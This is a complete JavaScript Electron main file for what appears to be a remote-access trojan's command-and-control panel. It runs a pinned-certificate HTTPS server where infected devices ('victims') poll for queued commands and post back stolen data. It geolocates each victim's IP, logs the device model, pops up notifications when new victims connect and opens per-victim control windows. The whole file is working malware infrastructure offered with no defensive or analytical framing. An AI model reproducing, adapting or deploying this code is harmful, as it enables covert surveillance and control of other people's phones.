const { app, BrowserWindow } = require('electron')
const electron = require('electron');
const { ipcMain } = require('electron');
var https = require('https');
var fs = require('fs');
var url = require('url');
var path = require('path');
var geoip = require('geoip-lite');
// 自签证书（与客户端 C2_PIN 公钥固定配对），随 app.asar 打包在 app/assets/cert
var CERT_DIR = path.join(__dirname, 'assets', 'cert');
var TLS_OPTS = {
    key: fs.readFileSync(path.join(CERT_DIR, 'key.pem')),
    cert: fs.readFileSync(path.join(CERT_DIR, 'cert.pem'))
};
var victimsList = require('./app/assets/js/model/Victim');
var CONSTANTS = require('./app/assets/js/Constants');
module.exports = victimsList;
//--------------------------------------------------------------
let win;
let display;
var windows = {};
var IO;
var sweepTimer = null;
// 当前正在监听的 REST 服务端实例与端口（用于支持「取消监听 / 换端口」）
var restServer = null;
var currentListenPort = null;
// 设备空闲阈值 / 清扫间隔（模块级：_idle() 与 setInterval 定时器回调都引用，必须放在模块作用域）
var IDLE_MS = 25000;
var SWEEP_MS = 10000;
//--------------------------------------------------------------

// 关闭当前监听：停掉 HTTPS 服务端 + 清掉离线清扫定时器。
// 重复点击 Listen / 换端口时先调用它，避免旧服务继续占着端口。
function stopListen() {
  if (sweepTimer) {
    clearInterval(sweepTimer);
    sweepTimer = null;
  }
  if (restServer) {
    try { restServer.close(); } catch (e) { /* 已关闭则忽略 */ }
    restServer = null;
  }
  IO = null;
  currentListenPort = null;
}

function createWindow() {


  // get Display Sizes ( x , y , width , height)
  display = electron.screen.getPrimaryDisplay();



  // SPLASH 开屏动画已移除：应用启动后主窗口加载完成直接显示，不再先弹开屏。


  //------------------------Main SCREEN INIT------------------------------------
  // Create the browser window.
  win = new BrowserWindow({
    icon: __dirname + '/app/assets/img/icon.png',
    width: 800,
    height: 600,
    show: false,
    resizable: false,
    position: "center",
    toolbar: false,
    fullscreen: false,
    transparent: true,
    frame: false,
    webPreferences: {
      nodeIntegration: true
    }
  });

  win.loadURL('file://' + __dirname + '/app/index.html');
  //open dev tools
  //win.webContents.openDevTools()

  // Emitted when the window is closed.
  win.on('closed', () => {
    // Dereference the window object, usually you would store windows
    // in an array if your app supports multi windows, this is the time
    // when you should delete the corresponding element.
    win = null
  })

  // Emitted when the window is finished loading.
  // 开屏已移除，直接显示主窗口（不再等待开屏 2 秒）。
  win.webContents.on('did-finish-load', function () {
    win.show();
  });
}



// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
app.on('ready', createWindow)

// Quit when all windows are closed.
app.on('window-all-closed', () => {
  // On macOS it is common for applications and their menu bar
  // to stay active until the user quits explicitly with Cmd + Q
  if (process.platform !== 'darwin') {
    app.quit()
  }
})

app.on('activate', () => {
  // On macOS it's common to re-create a window in the app when the
  // dock icon is clicked and there are no other windows open.
  if (win === null) {
    createWindow()
  }
})



// REST 适配器：把「受害者」抽象成一个 {emit, on, removeAllListeners} 对象，
// 接口签名与旧 wrapSocket 完全一致，所以 LabCtrl 的 27 处收发一行都不用改。
// 区别：下行命令不再由 WS push，而是客户端轮询 GET /sync 时从 outbound 队列里 pop；
//       上行结果由客户端 POST /sync 触发 _deliver。
function makeRestVictim(id) {
    var outbound = [];          // 待下发命令队列：{t, x}
    var handlers = {};          // 上行结果回调：type -> [cb]
    var lastSeen = Date.now();
    var api = {
        id: id,
        emit: function (type, payload) {
            var frameType = type;
            var body = payload;
            // 兼容旧写法：带 order 字段时，order 当作命令码，其余字段作载荷
            if (payload && typeof payload === 'object' && payload.order) {
                frameType = payload.order;
                body = {};
                for (var k in payload) {
                    if (k !== 'order' && Object.prototype.hasOwnProperty.call(payload, k)) {
                        body[k] = payload[k];
                    }
                }
            }
            outbound.push({ t: frameType, x: body });
        },
        on: function (type, cb) {
            if (!handlers[type]) handlers[type] = [];
            handlers[type].push(cb);
        },
        removeAllListeners: function (type) {
            if (type) {
                delete handlers[type];
            } else {
                handlers = {};
            }
        },
        // ---- 以下为面板内部使用，LabCtrl 看不到 ----
        _pop: function () { return outbound.shift() || null; },
        _deliver: function (type, payload) {
            var arr = handlers[type];
            if (!arr || arr.length === 0) return;
            for (var i = 0; i < arr.length; i++) {
                try { arr[i](payload); } catch (e) { /* 单个监听器出错不连累整条链路 */ }
            }
        },
        _touch: function () { lastSeen = Date.now(); },
        _idle: function () { return (Date.now() - lastSeen) > IDLE_MS; }
    };
    return api;
}


// fired when start listening
// 现在面板是 HTTPS REST 服务端：GET /sync 拉命令、POST /sync 收结果（同路径按方法区分）。
ipcMain.on('SocketIO:Listen', function (event, port) {

  // 已经在监听且端口相同 => 不做任何事（避免重复 listen 触发 EADDRINUSE 异常）。
  if (restServer && currentListenPort === String(port)) {
    return;
  }
  // 端口不同 / 之前没在监听 => 先停掉旧服务，再开新的（支持「换监听端口」）。
  stopListen();

  var server = https.createServer(TLS_OPTS, function (req, res) {
    var parsed = url.parse(req.url, true);
    if (parsed.pathname !== CONSTANTS.wsPath) {
      res.writeHead(404, { 'Content-Type': 'text/plain' });
      res.end('');
      return;
    }
    var p = CONSTANTS.victimParams;
    var id = parsed.query[p.id];
    if (!id) {
      res.writeHead(400, { 'Content-Type': 'text/plain' });
      res.end('');
      return;
    }

    if (req.method === 'GET') {
      // 首次出现 => 上线
      var v = victimsList.getVictim(id);
      if (v === -1) {
        var address = req.connection.remoteAddress;
        var ip = address;
        if (ip && ip.indexOf(':') !== -1) ip = ip.substring(ip.lastIndexOf(':') + 1);
        var country = null;
        var geo = geoip.lookup(ip);
        if (geo) country = geo.country.toLowerCase();
        var socket = makeRestVictim(id);
        victimsList.addVictim(socket, ip, req.connection.remotePort, country,
            parsed.query[p.manf], parsed.query[p.model], parsed.query[p.release], id);
        showNotification(id);
        if (win) win.webContents.send('SocketIO:NewVictim', id);
        v = victimsList.getVictim(id);
      } else {
        v.socket._touch();
      }
      var cmd = v.socket._pop();
      if (cmd) {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(cmd));
      } else {
        res.writeHead(204, { 'Content-Type': 'application/json' });
        res.end('');
      }
    } else if (req.method === 'POST') {
      var body = '';
      req.on('data', function (c) { body += c; });
      req.on('end', function () {
        var obj;
        try { obj = JSON.parse(body); } catch (e) {
          res.writeHead(400, { 'Content-Type': 'text/plain' }); res.end(''); return;
        }
        var v2 = victimsList.getVictim(id);
        if (v2 === -1) {
          res.writeHead(410, { 'Content-Type': 'text/plain' }); res.end(''); return;
        }
        v2.socket._touch();
        var type = obj[CONSTANTS.frameType];
        var payload = obj[CONSTANTS.framePayload];
        if (payload && typeof payload.buffer === 'string') {
          try { payload.buffer = Buffer.from(payload.buffer, 'base64'); } catch (e) {}
        }
        if (type) v2.socket._deliver(type, payload);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end('{}');
      });
    } else {
      res.writeHead(405, { 'Content-Type': 'text/plain' });
      res.end('');
    }
  });

  // 端口占用必须显式处理，否则会变成未捕获异常
  server.on('error', function (error) {
    if (error.code === 'EADDRINUSE') {
      win.webContents.send('SocketIO:Listen', "Address Already in Use");
    } else {
      throw error;
    }
  });

  server.listen(port, function () {
    if (win) win.webContents.send('SocketIO:Listening', port);
  });
  IO = server;
  restServer = server;
  currentListenPort = String(port);

  if (sweepTimer) clearInterval(sweepTimer);
  sweepTimer = setInterval(function () {
    var list = victimsList.getVictimList();
    for (var key in list) {
      if (!list.hasOwnProperty(key)) continue;
      if (list[key].socket._idle()) {
        victimsList.rmVictim(key);
        if (win) win.webContents.send('SocketIO:RemoveVictim', key);
        if (windows[key]) {
          var lw = BrowserWindow.fromId(windows[key]);
          if (lw) lw.webContents.send('SocketIO:VictimDisconnected');
          delete windows[key];
        }
      }
    }
  }, SWEEP_MS);
});

// 取消监听：关闭 HTTPS 服务端 + 清掉清扫定时器，并通知 UI 更新按钮状态。
ipcMain.on('SocketIO:Stop', function (event) {
  stopListen();
  if (win) win.webContents.send('SocketIO:Stopped');
});

// 上线通知小窗（原 WS 连接时弹出，现改为首次轮询时弹出）
function showNotification(index) {
  if (!win || !display) return;
  let notification = new BrowserWindow({
    frame: false,
    x: display.bounds.width - 280,
    y: display.bounds.height - 78,
    show: false,
    width: 280,
    height: 78,
    resizable: false,
    toolbar: false,
    webPreferences: { nodeIntegration: true }
  });
  notification.webContents.on('did-finish-load', function () {
    notification.show();
    setTimeout(function () { notification.destroy() }, 3000);
  });
  notification.webContents.victim = victimsList.getVictim(index);
  notification.loadURL('file://' + __dirname + '/app/notification.html');
}


//handle the Uncaught Exceptions
process.on('uncaughtException', function (error) {

  if (error.code == "EADDRINUSE") {
    win.webContents.send('SocketIO:Listen', "Address Already in Use");
  } else {
    electron.dialog.showErrorBox("ERROR", JSON.stringify(error));
  }

});



// Fired when Victim's Lab is opened
ipcMain.on('openLabWindow', function (e, page, index) {
  //------------------------Lab SCREEN INIT------------------------------------
  // create the Lab window
  let child = new BrowserWindow({
    icon: __dirname + '/app/assets/img/icon.png',
    parent: win,
    width: 600,
    height: 650,
    darkTheme: true,
    transparent: true,
    resizable: false,
    frame: false,
    webPreferences: {
      nodeIntegration: true
    }
  })

  //add this window to windowsList
  windows[index] = child.id;
  //child.webContents.openDevTools();

  // pass the victim info to this victim lab
  child.webContents.victim = victimsList.getVictim(index).socket;
  child.loadURL('file://' + __dirname + '/app/' + page)

  child.once('ready-to-show', () => {
    child.show();
  });

  child.on('closed', () => {
    delete windows[index];
    //on lab window closed remove all socket listners
    if (victimsList.getVictim(index).socket) {

      var socket = victimsList.getVictim(index).socket;
      Object.keys(CONSTANTS.orders).forEach(function (key) {
        socket.removeAllListeners(CONSTANTS.orders[key]);
      });
    }
  })
});